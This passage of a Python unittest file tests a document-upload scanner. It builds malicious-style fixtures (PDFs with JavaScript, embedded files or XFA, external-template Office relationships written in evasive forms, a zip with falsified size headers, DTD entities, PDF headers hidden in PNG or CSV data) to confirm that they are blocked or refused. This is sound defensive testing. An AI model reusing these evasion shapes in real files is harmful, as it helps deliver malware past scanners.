            bounds.grant(content._READ_PER_OBJECT)
        self.assertEqual(bounds.reads, content._READ_FACTOR * 100 + content._MAX_GRANT_BYTES)

    def test_a_file_of_tiny_headers_cannot_buy_itself_reads(self) -> None:
        tiny = pdf_with([CATALOG, PAGES, PAGE]) + b"9 0 obj\n" * 40_000
        with mock.patch.object(content, "_MAX_GRANT_BYTES", 1 << 20):
            self.assertIn(inspect(tiny), (None, Finding.UNSCANNABLE))  # bounded, either way

    def test_the_check_ends_at_its_deadline(self) -> None:
        now = [0.0]
        bounds = content._Bounds(1000, clock=lambda: now[0])
        bounds.read(1)
        now[0] = content._DEADLINE_SECONDS + 1
        with self.assertRaises(content._ReadBudgetSpent):
            bounds.read(1)

    def test_the_readers_decompress_as_before_outside_a_check(self) -> None:
        big = b"0" * (content._MAX_DECODED_BYTES + 1)
        # pdftypes does not re-export zlib; content.py replaced it there, which is what is tested.
        self.assertEqual(pdftypes.zlib.decompress(zlib.compress(big)), big)  # type: ignore[attr-defined]


def lying_zip(name: str, data: bytes, declared: int) -> bytes:
    """A one-part zip whose headers declare ``declared`` bytes for a part of ``len(data)``."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, data)
    raw = bytearray(buffer.getvalue())
    struct.pack_into("<I", raw, raw.find(b"PK\x03\x04") + 22, declared)
    struct.pack_into("<I", raw, raw.find(b"PK\x01\x02") + 24, declared)
    return bytes(raw)


TEMPLATE = b"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
RELS = b'<Relationships><Relationship Type="%s" TargetMode="External"/></Relationships>'


class SecurityReviewFailClosed(unittest.TestCase):
    """Security review, 17 Oct 2026: fail-open paths, and a second PDF reader."""

    def test_pdfium_blocks_what_pdfminer_missed(self) -> None:
        catalogs = (
            b"<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript << /Names [(a) 4 0 R] >> >> >>",
            b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(a) 4 0 R] >> >> >>",
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [] /XFA 4 0 R >> >>",
        )
        with mock.patch.object(content, "_pdf_finding", return_value=None):  # pdfminer saw nothing
            for catalog in catalogs:
                with self.subTest(catalog=catalog):
                    pdf = pdf_with([catalog, PAGES, PAGE, b"<< /Type /Filespec /F (a.txt) >>"])
                    self.assertIs(inspect(pdf), Finding.BLOCKED)
            self.assertIsNone(inspect(pdf_with([CATALOG, PAGES, PAGE])))  # an ordinary file passes

    def test_a_pdf_pdfium_cannot_open_keeps_pdfminers_verdict(self) -> None:
        self.assertIs(inspect(b"%PDF-1.7\n" + b"\x00garbage" * 50), Finding.UNSCANNABLE)

    def test_an_external_template_in_a_part_over_the_bound_is_unscannable(self) -> None:
        rels = RELS % TEMPLATE
        with mock.patch.object(content, "_MAX_RELS_BYTES", len(rels) - 1):  # was skipped: None
            self.assertIs(
                inspect(with_member(spreadsheet(), "xl/_rels/a.xml.rels", rels)), Finding.UNSCANNABLE
            )

    def test_a_part_bigger_than_it_declares_is_unscannable(self) -> None:
        self.assertIs(inspect(lying_zip("_rels/.rels", b" " * (3 << 20), 10)), Finding.UNSCANNABLE)

    def test_an_external_template_written_another_valid_way_is_blocked(self) -> None:
        single = b"<Relationships><Relationship Type='%s' TargetMode='External'/></Relationships>"
        escaped = b'<Relationships><Relationship Type="%s" TargetMode="&#69;xternal"/></Relationships>'
        for name, rels in (
            ("xl/_rels/a.xml.rels", single),
            ("xl/_rels/a.xml.rels", escaped),
            ("xl/_rels/A.XML.RELS", RELS),
        ):
            with self.subTest(name=name, rels=rels):
                self.assertIs(inspect(with_member(spreadsheet(), name, rels % TEMPLATE)), Finding.BLOCKED)

    def test_relationships_with_a_dtd_or_bad_xml_are_unscannable(self) -> None:
        for rels in (b'<!DOCTYPE r [<!ENTITY e "External">]><Relationships/>', b"<Relationships"):
            with self.subTest(rels=rels):
                self.assertIs(
                    inspect(with_member(spreadsheet(), "xl/_rels/a.xml.rels", rels)), Finding.UNSCANNABLE
                )

    def test_a_pdf_header_hidden_in_another_type_is_blocked(self) -> None:
        png = png_bytes()
        for data in (b"Name,Amount\n%PDF-1.7\n", png[:33] + b"%PDF-1.7\n" + png[33:]):
            with self.subTest(data=data[:12]):
                self.assertIs(inspect(data), Finding.BLOCKED)

    def test_an_old_office_file_that_cant_be_read_is_never_called_safe(self) -> None:
        # Changed on purpose (#522, security review 6 Nov 2026): an old Office file has a check of
        # its own now (NewFormats), so it is no longer refused for having none; one whose
        # directory can't be read is unscannable, never let through.
        old_xls = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
        self.assertIs(inspect(old_xls), Finding.UNSCANNABLE)


GOLDEN = Path(__file__).parent / "golden"


def scanned_pdf(pages: int, dpi: int = 150) -> bytes:
    """A scan as a scanner app saves one: a ``dpi`` greyscale picture of text on each A4
    page, written by pdfium (one page, one content stream and one picture per page)."""
    document = pdfium.PdfDocument.new()
    for _ in range(pages):
        page = document.new_page(595, 842)
        picture = pdfium.PdfImage.new(document)
        size = (1240 * dpi // 150, 1754 * dpi // 150)
        picture.set_bitmap(pdfium.PdfBitmap.from_pil(text_like_picture(*size, mode="L")))
        picture.set_matrix(pdfium.PdfMatrix().scale(595, 842))
        page.insert_obj(picture)
        page.gen_content()
    out = io.BytesIO()
    document.save(out)
    return out.getvalue()


# The padding every Standard-security password is filled to 32 bytes with (PDF 1.7, 7.6.3.3).
PASSWORD_PAD = bytes.fromhex("28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A")


def rc4(key: bytes, data: bytes) -> bytes:
    """RC4, the cipher of the oldest PDF encryption (V1, R2): for building a test file only."""
    box, j = list(range(256)), 0
    for i in range(256):
        j = (j + box[i] + key[i % len(key)]) % 256
        box[i], box[j] = box[j], box[i]
    out, i, j = bytearray(), 0, 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        out.append(byte ^ box[(box[i] + box[j]) % 256])
    return bytes(out)


def owner_locked_pdf(permissions: int = -44) -> bytes:
    """A one-page PDF encrypted with an owner password only (printing and copying turned
    off; ``permissions=0`` turns every permission off, #551): every reader opens it with no
    password, as a bank or registry statement often is.
    PDF 1.7 algorithms 3 (O), 2 (the key) and 4 (U), 40-bit RC4."""

    def md5(data: bytes) -> bytes:
        return hashlib.md5(data, usedforsecurity=False).digest()  # what the format uses

    doc_id = b"\x33" * 16
    owner = rc4(md5((b"owner-secret" + PASSWORD_PAD)[:32])[:5], PASSWORD_PAD)
    key = md5(PASSWORD_PAD + owner + struct.pack("<i", permissions) + doc_id)[:5]
    object_4_key = md5(key + b"\x04\x00\x00\x00\x00")[:10]  # object 4, generation 0
    page_text = rc4(object_4_key, b"BT /F1 12 Tf 72 700 Td (Total 500) Tj ET")
    objects = [
        CATALOG,
        PAGES,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length %d >>\nstream\n" % len(page_text) + page_text + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Filter /Standard /V 1 /R 2 /P %d /O <%s> /U <%s> >>"
        % (permissions, owner.hex().encode(), rc4(key, PASSWORD_PAD).hex().encode()),
    ]
    plain = pdf_with(objects)
    trailer = b"/Root 1 0 R /Encrypt 6 0 R /ID [<%s> <%s>]" % (doc_id.hex().encode(), doc_id.hex().encode())
    return plain.replace(b"/Root 1 0 R", trailer)  # after the index: its offsets still hold


class OrdinaryPdfsFitTheReadBudget(unittest.TestCase):
    """Test server, 4 Nov 2026: a customer's sale deed was refused as ``unscannable``. The
    read budget did not cover pdfminer's own re-reads (a 4 KiB buffer filled again at every
    seek, four times for a stream object), so ordinary PDFs of many small objects ran out."""

    def test_every_golden_pdf_passes(self) -> None:
        paths = sorted(GOLDEN.rglob("*.pdf"))
        self.assertGreater(len(paths), 30)
        for path in paths:
            with self.subTest(pdf=path.name):
                self.assertIsNone(inspect(path.read_bytes()))

    def test_a_long_scanned_pdf_passes(self) -> None:
        scan = scanned_pdf(30)
        self.assertGreater(len(scan), 300_000)
        self.assertIsNone(inspect(scan))

    def test_a_pdf_locked_with_an_owner_password_only_passes(self) -> None:
        """It opens with no password, so every object is decrypted and walked."""
        locked = owner_locked_pdf()
        self.assertIsNone(inspect(locked))
        self.assertIn(b"/Encrypt", locked)

    def test_a_pdf_locked_with_no_permissions_at_all_passes(self) -> None:
        """#551 (UAT GR-08): pdfminer read ``/P 0`` as 2**32 and crashed packing it, so a
        PDF with every permission off was refused as one that could not be checked."""
        self.assertIsNone(inspect(owner_locked_pdf(permissions=0)))

    def test_a_pdf_that_needs_a_password_to_open_is_refused_as_one(self) -> None:
        """Nothing in it can be read, so it is not called safe. Changed on purpose (#552, UAT
        FF-14): it was ``unscannable`` ("could not be checked for viruses"); the customer is now
        told it has a password."""
        locked = make_pdf([Page(texts=[Text(72, 700, "Total 500")])], password_protected=True)
        self.assertIs(inspect(locked), Finding.ENCRYPTED)


if __name__ == "__main__":
    unittest.main()
